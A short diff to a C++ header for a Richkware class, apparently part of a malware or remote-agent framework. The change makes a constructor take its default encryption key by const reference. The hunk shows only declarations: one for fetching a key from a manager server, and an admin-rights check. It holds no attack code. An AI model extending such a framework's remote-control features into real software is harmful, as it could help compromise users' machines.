@@ -40,7 +40,7 @@ public:
     Richkware(const char *AppNameArg, std::string EncryptionKeyArg);
 
     //Get secure key from Richkware-Manager-Server and set it as encryption key. DefaultPass is used as temporary encryption key to ensure a safety communication with RMS and if this app cannot reach the RMS, then it will use DefaultPass as encryption key.
-    Richkware(const char *AppNameArg, std::string defaultEncryptionKey, const char *serverAddress, const char *port,
+    Richkware(const char *AppNameArg, const std::string& defaultEncryptionKey, const char *serverAddress, const char *port,
               const char *associatedUser);
 
     BOOL IsAdmin();
